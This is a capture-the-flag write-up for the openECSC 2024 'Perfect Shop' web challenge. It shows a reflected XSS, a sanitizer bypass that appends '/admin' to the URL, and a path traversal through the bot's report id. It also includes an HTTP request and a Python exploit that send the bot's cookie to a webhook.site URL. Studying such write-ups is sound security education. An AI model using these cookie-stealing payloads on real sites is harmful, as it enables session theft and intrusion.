# openECSC 2024 - Round 1

## [web] Perfect Shop (198 solves)

Do you like perfect things? Check out my new online shop!

Site: [http://perfectshop.challs.open.ecsc2024.it](http://perfectshop.challs.open.ecsc2024.it)

Author: Stefano Alberto <@Xato>

## Overview

The challenge consists of a simple ecommerce website that allows users to view and search a list of items.

Additionally, the application exposes an administration interface that requires access with an unknown password to modify the items.

Finally, it is possible to have one of the available items on the website visited by a bot that has the flag as a cookie

## XSS

The search functionality is vulnerable to a trivial XSS, the searched value is in fact reflected in the page without HTML escaping.

However, the application is protected by a sanitizer, which automatically removes malicious HTML tags from the parameters sent to the server.

## Sanitizer bypass

The sanitizer is configured to use a whitelist of endpoints on which the check should not be performed.
In particular, this list only contains the `/admin` endpoint.

By analyzing how the withelist check is implemented, we can see that this is not done correctly (for the version used by the challenge).

The following line of the code is used by the library to perform the whitelist check.

```
!whiteList.some((v) => req.url.trim().includes(v))
```

In particular, the library does not sanitize if the visited url **contains** a value in the whitelist.

For this reason, sanitization can be avoided by visiting the path `/random?x=/admin`.

Therefore, to trigger the XSS, it is sufficient to visit the path `/search?q=<script>alert(1)</script>&x=/admin`.

## XSS on the bot

The functionality triggering the bot to visit a page allows it only to visit a product page starting from the product id provided in the request.

This value is converted by the `parseInt` function and is verified to be a valid product id.

If the value is valid, the bot makes the visit by constructing the URL to visit with the value provided **before** converting to integer.
In practice, this allows us to make the bot to visit an arbitrary server path, sending as the id to visit a payload similar to `1/../../search?q=aaa`.

By making the bot visit an arbitrary path, we can exploit XSS on the search functionality to steal the cookie containing the flag, while staying under the limit of usable characters.

An example of a payload that can be used to send the cookie to a webhook is given.
Note how it is necessary to include the string `/admin` also in the request to the endpoint to make the report, so that our payload is not sanitized.

```
POST /report?/admin HTTP/1.1
Host: localhost:3000
Content-Length: 223
Origin: http://localhost:3000
Content-Type: application/x-www-form-urlencoded

id=1%2f..%2f..%2fsearch%3ffetch(%60https%3a%2f%2fwebhook.site%2fYOUR-WEBHOOK-HERE%2f%24%7bdocument.cookie%7d%60)%2f%2f%26q%3d%3cscript%3eeval(location.search.slice(1))%3c%2fscript%3eaa%26%2fadmin&message=
```

Triggering the bot to execute the following script.

```html
<script>eval(location.search.slice(1))</script>
```

This allows us to execute an arbitrary payload that we can write at the beginning of the URL while respecting the length limit on the `q` parameter, leaking the flag to our webhook.

## Exploit

```python
import requests
import time
import re
import urllib.parse

chall_url = "http://perfectshop.challs.open.ecsc2024.it"

r = requests.post('https://webhook.site/token')
token_id = r.json()['uuid']

webhook_url = f'https://webhook.site/{token_id}/'

payload = '1/../../search?fetch(`' + webhook_url + '/?${document.cookie}`)//&q=<script>eval(location.search.slice(1))</script>&/admin'
r = requests.post(chall_url + "/report?/admin", data={"id": payload, "message": "x"})

assert 'Report submitted successfully' in r.text

for _ in range(10):
    r = requests.get('https://webhook.site/token/'+ token_id +'/requests')

    for request in r.json()['data']:
        m = re.search(r'openECSC\{.+\}', urllib.parse.unquote(request['url']))
        if (m):
           print(m.group(0))
           exit()
           
    time.sleep(2)
```
